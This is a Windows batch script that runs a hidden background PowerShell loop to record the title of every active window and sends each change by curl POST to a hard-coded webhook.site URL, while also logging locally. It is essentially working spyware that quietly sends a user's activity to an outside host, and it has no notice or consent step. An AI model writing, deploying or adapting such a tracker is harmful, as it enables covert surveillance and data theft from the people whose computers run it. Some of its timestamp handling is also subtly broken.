@echo off
setlocal enabledelayedexpansion

set LOG_FILE=%~dp0activity_log.txt
set CURL_PATH=C:\Windows\System32\curl.exe
set WEBHOOK_URL=https://webhook.site/2c7348c4-f3c8-4021-bd78-95b6c172ad05
set LAST_TITLE=NONE

echo [+] High-Speed Logger Started > "%LOG_FILE%"

:: Start a persistent PowerShell session that listens for commands
start /b powershell -NoExit -Command "$host.UI.RawUI.WindowTitle = 'TitleHelper'; while($true) { $h = (Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object -Last 1).MainWindowTitle; if($h) { $h } else { 'Desktop' }; Start-Sleep -Milliseconds 400 }" > "%temp%\title_stream.txt" 2>&1

:loop
:: Read the latest line from the PowerShell stream
for /f "tokens=*" %%i in ('type "%temp%\title_stream.txt" 2^>nul') do set "current_window=%%i"

:: If we got a result, check for changes
if defined current_window (
    if not "!current_window!"=="!LAST_TITLE!" (
        set "LAST_TITLE=!current_window!"
        
        :: Get Timestamp
        set "timestamp=%date% %time%"
        if "%time:~0,1%"==" " set "timestamp=%date% 0%time%"

        :: Send to Webhook
        %CURL_PATH% -s -X POST ^
             -H "Content-Type: application/json" ^
             -d "{\"event\": \"change\", \"title\": \"!current_window!\", \"timestamp\": \"%timestamp%\"}" ^
             "%WEBHOOK_URL%" >> "%LOG_FILE%" 2>&1
        
        echo [%timestamp%] Change: !current_window! >> "%LOG_FILE%"
    )
)

:: Small delay to prevent CPU spike
ping 127.0.0.1 -n 1 -w 100 >nul

goto loop